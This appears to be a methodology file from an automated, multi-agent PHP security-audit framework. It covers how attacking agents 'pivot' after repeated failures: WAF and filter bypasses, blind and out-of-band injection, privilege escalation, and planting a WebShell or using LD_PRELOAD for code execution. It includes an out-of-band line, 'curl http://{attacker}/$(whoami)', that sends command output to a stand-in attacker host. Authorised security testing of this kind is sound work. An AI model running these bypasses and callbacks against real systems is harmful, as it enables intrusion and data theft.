# Smart Pivot Strategy

When a Phase-4 expert **fails 3 consecutive rounds** in the attack loop, the Smart Pivot sub-process is triggered. Replaces the original static mapping with a dynamic reconnaissance + decision tree model.

---

## Trigger Conditions

```
IF current_round >= 4 AND last 3 consecutive rounds all failed (no confirmed / no partial)
THEN trigger Smart Pivot
```

## Pivot Decision Flow

```
3 consecutive round failures
    │
    ▼
┌─────────────────────────────────────┐
│  Step 1: Re-Reconnaissance          │
│  (Mini-Researcher)                  │
│  Re-read target source code,        │
│  look for missed filter logic       │
└──────────────┬──────────────────────┘
               │
               ▼
┌─────────────────────────────────────┐
│  Step 2: Cross-Intelligence         │
│  (Cross-Intel)                      │
│  Read shared findings repository    │
│  Check if other experts found       │
│  related clues                      │
└──────────────┬──────────────────────┘
               │
               ▼
┌─────────────────────────────────────┐
│  Step 3: Decision Tree Matching     │
│  Select Pivot direction based on    │
│  failure pattern                    │
└──────────────┬──────────────────────┘
               │
         ┌─────┴─────┐
         │           │
    New path     No new path
    found        found
         │           │
    Continue     Mark failed
    attacking    (stop wasting)
    (remaining
     rounds)
```

## Step 1: Re-Reconnaissance (Mini-Researcher)

After failure, do not immediately switch strategy; first execute a **30-second quick reconnaissance**:

### 1.1 Re-Read Filter Logic

```
Re-read the Sink's file and all files in its call chain, focusing on:
- Previously missed sanitize/escape/filter functions
- Implicit filtering at middleware layer (e.g., Laravel's TrimStrings/ConvertEmptyStringsToNull)
- Global before_filter / request interceptors
- URL rewrite rules in .htaccess or Nginx configuration
```

### 1.2 Check Alternative Entry Points

```
When the current parameter injection point is filtered, check:
- Whether other Actions in the same Controller call the same Sink
- Whether the same Sink function has other callers (paths not yet traced)
- Whether API/CLI entry points bypass web-layer filtering
- Whether JSON API skips HTML form filtering rules
```

### 1.3 Environment Condition Recheck

```
Re-check environment_status.json:
- Whether disable_functions list has overlooked available functions
- Whether PECL extensions provide alternative execution paths
- Whether PHP config has special settings (e.g., auto_prepend_file)
```

## Step 2: Cross-Intelligence (Cross-Intel)

Read the shared findings repository (`bash tools/audit_db.sh finding-read "$WORK_DIR"`), search for related findings:

```
Matching rules:
1. Findings on the same file path → may reveal new attack surfaces
2. Findings on the same controller/route → may provide authentication bypass
3. File write findings → may be used to write WebShell to assist current attack
4. Information disclosure findings → may expose internal paths/configs to aid exploitation

Cross-exploitation examples:
- infoleak-auditor found phpinfo() → obtain precise disable_functions list
- filewrite-auditor confirmed /tmp is writable → try LD_PRELOAD path for RCE
- authz-auditor found admin endpoint → retry blocked payloads from admin privileges
- ssrf-auditor confirmed internal network reachable → relay through SSRF to bypass WAF
```

## Step 3: Decision Tree

Select Pivot direction based on **failure pattern classification**:

### Failure Pattern A: WAF/Filter Interception (HTTP 403/406/Block Page)

```
Decision path:
├─ Encoding bypass attempted?
│   ├─ No → Use payload_encoder.php to try: double encoding → Unicode → wide byte
│   └─ Yes → WAF-specific bypass attempted?
│       ├─ No → Load corresponding WAF ruleset from waf_bypass.md
│       └─ Yes → Try protocol-layer bypass:
│           ├─ HTTP method switching (GET→POST→PUT→PATCH)
│           ├─ Content-Type switching (form→json→xml→multipart)
│           ├─ Chunked transfer encoding (Transfer-Encoding: chunked)
│           ├─ HTTP/2 feature exploitation
│           └─ All failed → check shared_findings for SSRF → relay through internal network
```

### Failure Pattern B: Parameter Filtered/Escaped (HTTP 200 But Payload Ineffective)

```
Decision path:
├─ Filter type identified?
│   ├─ htmlspecialchars → Try: attribute injection / JavaScript events / CSS injection
│   ├─ addslashes → Try: wide byte (%bf%27) / numeric injection / subquery
│   ├─ preg_replace → Analyze regex, construct equivalent payload that doesn't match
│   ├─ Custom blocklist → Test character by character, find unfiltered critical characters
│   └─ Unidentified → Execute Step 1.1 re-reconnaissance
├─ Alternative parameters available?
│   └─ Step 1.2 check alternative entry points
└─ Is second-order attack possible?
    └─ Check if parameter is stored → whether storage location has read+concatenation → second_order path
```

### Failure Pattern C: No Echo/Blind Injection (HTTP 200 But Cannot Confirm)

```
Decision path:
├─ Time-based blind: sleep(5) / pg_sleep(5) / BENCHMARK(10000000,MD5('x'))
├─ Boolean-based blind: compare response differences between true/false conditions
├─ OOB out-of-band:
│   ├─ DNS: {payload}.{unique}.burpcollaborator.net
│   ├─ HTTP: curl http://{attacker}/$(whoami)
│   └─ File: write to predictable path then access to confirm
└─ Error triggering: deliberately cause syntax errors to observe error handling differences
```

### Failure Pattern D: Authentication/Authorization Block (HTTP 401/403 Non-WAF)

```
Decision path:
├─ Check credentials.json for higher privilege roles
├─ Check shared_findings for authentication bypass found by authz-auditor
├─ Try parameter-level privilege escalation (IDOR): replace user_id / resource_id
└─ Try HTTP method tampering: GET→POST / add X-Original-URL header
```

### Failure Pattern E: Sink Actually Unreachable (Code Path Analysis Error)

```
Decision path:
├─ Re-read call chain, confirm whether preconditions are unmet
├─ Check whether specific session state is required (e.g., non-empty cart, completed form, etc.)
├─ Check for async/queue execution (Sink in Job/Event, not synchronously triggered)
└─ Confirmed unreachable → downgrade to ⚡ potential flaw, stop attempts
```

## Pivot Result Handling

### Pivot Decision Fill-in Table (MANDATORY)

Before executing any pivot, fill the following table to document the decision:

| # | Decision Item | Fill-in Value |
|---|--------------|---------------|
| 1 | Failure pattern classification | {A: WAF/Filter / B: Parameter Filtered / C: Blind / D: Auth Block / E: Unreachable} |
| 2 | Consecutive failure rounds | {count, e.g. 3} |
| 3 | Failure evidence summary | {HTTP status + response pattern, e.g. "R3-R5 all returned 403 with WAF block page"} |
| 4 | Step 1 (Re-Recon) result | {new_info_found / no_new_info / skipped_reason} |
| 5 | Step 2 (Cross-Intel) result | {related_finding_id or "no relevant findings"} |
| 6 | Decision tree path taken | {e.g. "Pattern A → encoding bypass attempted=Yes → WAF-specific=No → load waf_bypass.md"} |
| 7 | Selected pivot action | {encoding_bypass / protocol_switch / alt_parameter / blind_technique / privilege_change / early_termination} |
| 8 | Pivot payload/technique | {specific payload or technique to try next} |
| 9 | Expected outcome indicator | {what response would confirm success, e.g. "HTTP 200 with command output in body"} |

### Failure Pattern → Recommended Pivot Lookup Table

| Failure Pattern | Sub-condition | Priority 1 Pivot | Priority 2 Pivot | Priority 3 Pivot | Termination Condition |
|----------------|---------------|------------------|------------------|------------------|-----------------------|
| A: WAF Block (403/406) | Encoding not tried | Double/Unicode/wide-byte encoding | Protocol-layer bypass (method/content-type switch) | SSRF relay via internal network | All encoding + protocol + relay failed |
| A: WAF Block | Encoding tried, WAF-specific not tried | Load WAF ruleset from waf_bypass.md | Chunked transfer encoding | HTTP/2 feature exploitation | WAF-specific + chunked + H2 all failed |
| A: WAF Block | All WAF bypasses tried | Check shared_findings for SSRF relay | Try alternate endpoint for same sink | Early termination | No SSRF + no alternate endpoint |
| B: Filtered (200 but ineffective) | htmlspecialchars | Attribute/event injection | CSS injection context | DOM-based (no server reflection) | All 3 contexts tested |
| B: Filtered | addslashes | Wide-byte (%bf%27) | Numeric/subquery injection | Second-order (stored+read) | All 3 techniques failed |
| B: Filtered | preg_replace | Regex analysis + equivalent payload | Alternative parameter (Step 1.2) | Second-order path | Regex unbypassable + no alt param |
| B: Filtered | Custom blocklist | Char-by-char testing | Alternative parameter | Encoding combinations | All critical chars blocked + no alt |
| B: Filtered | Filter type unknown | Re-reconnaissance (Step 1.1) | Try all filter-specific pivots | Early termination | Re-recon found nothing new |
| C: Blind (200 no echo) | Time-based not tried | sleep(5) / pg_sleep(5) | Boolean-based comparison | OOB DNS/HTTP callback | All 3 blind techniques failed |
| C: Blind | Time-based tried | Boolean-based | OOB (DNS → HTTP → File) | Error-based (syntax error diffs) | All 4 techniques exhausted |
| D: Auth Block (401/403) | Higher credentials available | Switch to higher-privilege credential | IDOR (replace user_id/resource_id) | HTTP method tampering | All credentials + IDOR + method failed |
| D: Auth Block | No higher credentials | Check shared_findings for auth bypass | IDOR parameter tampering | X-Original-URL header | No bypass found in cross-intel |
| E: Unreachable | Precondition unmet | Set up required state (session/cart/form) | Check async/queue execution path | Downgrade to "potential" | Confirmed unreachable after state setup |

**CR-PIVOT-1**: MUST fill the Pivot Decision table BEFORE executing the pivot — empty table = QC FAIL.
**CR-PIVOT-2**: MUST follow Priority 1 → 2 → 3 order. Skipping priorities MUST be justified in field 6.
**CR-PIVOT-3**: When Termination Condition is met, MUST stop and record early_termination=true.

### Pivot Succeeded (New Path Found)

```
Record Pivot process to exploits/{sink_id}.json:
{
  "pivot_triggered_at_round": 4,
  "pivot_reason": "waf_block",
  "pivot_action": "mini_researcher",
  "pivot_discovery": "Found JSON API bypasses WAF rules",
  "resumed_at_round": 5,
  "final_status": "confirmed"
}
```

### Pivot Failed (No New Path)

```
Terminate attack loop early, do not waste remaining rounds:
{
  "pivot_triggered_at_round": 4,
  "pivot_reason": "param_filter",
  "pivot_action": "mini_researcher + cross_intel",
  "pivot_discovery": "No new attack surface",
  "early_termination": true,
  "final_status": "failed",
  "recommendation": "Manual review of app/Http/Middleware/SanitizeInput.php filter logic required"
}
```

> **Principle**: It is better to terminate early with a clear manual review recommendation than to continue wasting rounds after all strategies have been exhausted, producing hallucinated results.
